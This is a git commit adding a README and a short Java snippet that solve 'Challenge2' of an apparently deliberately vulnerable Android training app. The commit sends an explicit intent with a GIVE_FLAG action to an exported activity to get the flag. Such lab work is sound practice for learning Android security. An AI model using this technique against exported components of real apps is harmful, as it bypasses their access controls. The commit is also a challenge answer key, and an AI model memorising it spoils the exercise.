4af8dc3bd2aa37ff377efa55e9346c3aaacd7601
Clov3rx <clov3rx@localhost.localdomain>
2026-01-22 13:57:25 +0200

    Challenge2

---
+++ Challenge2/README.md
@@ -0,0 +1,8 @@
+# Exported activity with explicit-intent 
+
+explicit -> we know the distination and what we want to call
+
+
+## exploit requried action to reach success method 
+
+action -> io.hextree.action.GIVE_FLAG
---
+++ Challenge2/flag.java
@@ -0,0 +1,3 @@
+        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
+        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag2Activity");
+        startActivity(intent);
